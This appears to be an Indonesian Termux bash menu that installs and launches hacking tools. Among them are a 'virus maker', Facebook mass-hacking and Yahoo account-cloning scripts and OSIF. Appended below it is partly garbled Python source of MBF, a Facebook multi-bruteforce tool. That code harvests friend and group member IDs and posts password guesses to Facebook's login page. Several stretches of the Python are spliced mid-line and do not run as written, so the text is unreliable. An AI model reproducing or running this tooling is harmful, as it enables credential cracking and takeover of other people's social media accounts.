#!/bin/bash
#version 1.0
#RECODE MULU KONTOL USAHA NGAPA
#KALAU MAU BELAJAR BIKIN TOOL KUASAI PROGRAMING
#BISA BELAJAR PROGRAMING DI google

# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet Sanjaya | lolcat

echo -e  "_____________________________________________________________"
echo -e  "Tools    : SanjayaDtm scrip $white         " |lolcat
echo -e  "Facebook  : Sanjaya Dtm $white   " |lolcat
echo -e  "WA  : 083197998878 $white " |lolcat
echo -e  "Youtube:  Sanjaya Dtm $white " |lolcat
echo -e  "_____________________________________________________________"

###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
echo -e $cyan"[#]> Thanks"
sleep 1
echo ""
echo -e $white"[#]> see you gaes :)..."
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo -e $b "1.  Nmap${enda}";
echo -e "============================" | lolcat
echo -e $b "2.  Admin-finder${endc}";
echo -e "============================" | lolcat
echo -e $b "3.  RED_HAWK${endc}";
echo -e "============================" | lolcat
echo -e $b "4   Lazymux${endc}";
echo -e "============================" | lolcat
echo -e $b"5.  Buat ViRus 2019${endc}";
echo -e "============================" | lolcat
echo -e $b"6.  Dark-FBv1.7${endc}";
echo -e "============================" | lolcat
echo -e $b"7. Hack FB MASSAL${endc}";
echo -e "============================" | lolcat
echo -e $b"8. Cloning YAHOO FB${endc}";
echo -e "============================" | lolcat
echo -e $b"9. Bot Instagram${endc}";
echo -e "============================" | lolcat
echo -e $b"10. Tools OSIF${endc}";
echo -e "============================" | lolcat
echo -e $b "0. Exit${endc}";
echo ""
echo -e "╭─Pilih Cuk" |lolcat
read -p "╰─#" pil;

# Nmap

case $pil in
1) pkg install nmap
echo -e  "${y} {1} Masukkan Web${endc}:"
read web
nmap $web
echo

;;

# admin-finder

2) git clone  https://github.com/the-c0d3r/admin-finder.git
echo -e "${y} cara menggunakan admin finder"
echo -e "${y} cd admin-finder"
echo -e "${y} python admin-finder.py"
cd /data/data/com.termux/files/home/admin-finder/
python2 /data/data/com.termux/files/home/admin-finder/admin-finder.py
echo

;;

#RED_HAWK

3) git clone https://github.com/Tuhinshubhra/RED_HAWK
echo -e "${y} Installer RED_HAWK..."
echo -e "${y} cd RED_HAWK"
echo -e "${y} php RED_HAWK.php"
cd /data/data/com.termux/files/home/RED_HAWK/
php /data/data/com.termux/files/home/RED_HAWK/ RED_HAWK.php

;;

#Lazymux

4) git clone https://github.com/Gameye98/Lazymux
echo -e "${y} Installer Lazymux..."
echo -e "${y} cd Lazymux"
echo -e "${y} python lazymux.py"
cd /data/data/com.termux/files/home/Lazymux/
python2 /data/data/com.termux/files/home/Lazymux/ lazymux.py

;;

#Virus Vbug

5) apt update
pkg install python2 git -y
git clone https://github.com/Junior60/vbug
mv vbug $HOME
cd $HOME/vbug
chmod +x vbug.py
python2 vbug.py

;;

#MBF

7) apt update
pkg install git
pkg install python2
pip2 install mechanize
git clone https://github.com/pirmansx/MBF
mv MBF $HOME
cd $HOME/MBF
chmod +x MBF.py
python2 MBF.py

;;

#YahooCloning

8) apt update
pkg install git
pkg install python2
pip install request
git clone https://github.com/wahyuandhika/YahooCloning
mv YahooCloning $HOME
cd $HOME/YahooCloning
chmod +x cloning.py

;;

#BotInstagram

9) apt update
pkg install git
pkg install python2 -y
pip2 install --upgrade pip
git clone https://github.com/instagrambot/instabot
mv instabot $HOME
cd $HOME/instabot
pip install -U instabot
cd examples
mv multi_script_CLI.py main.py
chmod +x main.py
python2 main.py

;;

#OSIF

10) apt update
pkg install git
pkg install python2
git clone https://github.com/ciku370/OSIF
mv OSIF $HOME
cd $HOME/OSIF
pip2 install -r requirements.txt
python2 osif.py

;;

0) echo "created by : SanjayaDtm Termux" | lolcat
exit
;;

*) echo "sorry, anda harus beli lisensi kepada
yang punya scrip"
esac
done
done



import platform,os,sys
def cetak(x,e=0):
	w = 'mhkbpcP'
	for i in w:
		j = w.index(i)
		x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
	x += '\033[0m'
	x = x.replace('!0','\033[0m')
	if e != 0:
		sys.stdout.write(x)
	else:
		sys.stdout.write(x+'\n')
if platform.python_version().split('.')[0] != '2':
	cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
	sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
  import mechanize
except ImportError:
	cetak('!m[!] SepertiNya Module !cmechanize!m belum di install...\n!h[!] pip2 install mechanize')
	sys.exit()
br = 0
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
class mt(threading.Thread):
	def __init__(self,i,p):
		threading.Thread.__init__(self)
		self.id = i
		self.a = 0
		self.p = p
	def update(self):
		return self.a,self.id
	def run(self):
		try:
			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
		except KeyboardInterrupt:
			sys.exit()
		except:
			self.a = 4
			sys.exit()	th[len(th)-1].start()
			e)
	br.set_handle_refresh(mechanize._http.HTTPRecetak('!m[!] Gagal meyimpan')
	if len(id_bteman) != 0:
		cetak('!h[*] Menyimpan hasil daftar Teman...')
		try:
			open(os.sys.path[0]+'/MBFteman.txt','w').write('\n'.join(id_bteman))
			cetak('!h[!] Berhasil meyimpan !cMBFteman.txt')
		except:
			cetak('!m[!] Gagal meyimpan')
def keluar():
	s
	while 1:
		try:
			i = int(inputD(x))
		except:
			cetak('!m[!] Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			cetak('!m[!] Pilihan tidak ada')
	return i
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i =		os.remove(os.sys.path[0]+'/MBFgroup.txt')
			fid_bgroup = []
	return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?] Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/MBFteman.txt')
			fid_bteman = []
	return 0
def buka(d):
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		cetak('\r!m[!] Gagal membuka !p'+str(d))
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?] Email/HP')
	pa = inputD('[?] Kata Sandi')
	cetak('!h[*] Sedang Login....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		cetak('!h[*] Selamat datang !k%s'%nama)
		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
		log = 1
	elif 'checkpoint' in url:
		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
		keluar()
	else:
		cetak('!m[!] Login Gagal')
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h dulu bos...')
		login()
		if log == 0:
			keluar()
	next = saring_id_group0()
	while 1:
		saring_id_group1(buka(next))
		try:
			next = br.find_link(url_regex='/browse/group/members/').url
		except:
			cetak('!m[!] Hanya Bisa Mengambil !h %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_bteman.append(i)
def idteman():
	if log != 1:
		cetak('!h[*] Login !bFB !hdulu bos...')
		login()
		if log == 0:
			keluar()
	cetak('!h[*] Sedang mengumpulkan id teman...')
	buka('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
	jumlah = br.find_link(url_regex='/friends/center/friends/').text
	jumlah = re.findall(r'\((.*a?)\)',jumlah)[0]
	cetak('!h[*] Mengambil !p%s !hid teman'%jumlah) 
	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex='friends_center_main').url
	except:
		if len(id_teman) != 0:
			cetak('!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
		else:
			cetak('!m[!] Batal')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		cetak('\r!h[*] !p%s !hid terambil...'%len(id_bteman),1)
		sys.stdout.flush()
		try:
			next = br.find_link(url_regex='friends_center_main').url
		except:
			cetak('\n!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bteman)
	else:
		return menu()
def menu():
	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
	i = inputM('[?] PILIH',[1,2,3])
	if i == 2:
		lanjutG()
		idgroup()
	elif i == 1:
		lanjutT()
		idteman()
	elif i == 3:
		keluar()
bacaData()
install_browser()
menu()
#
#
#
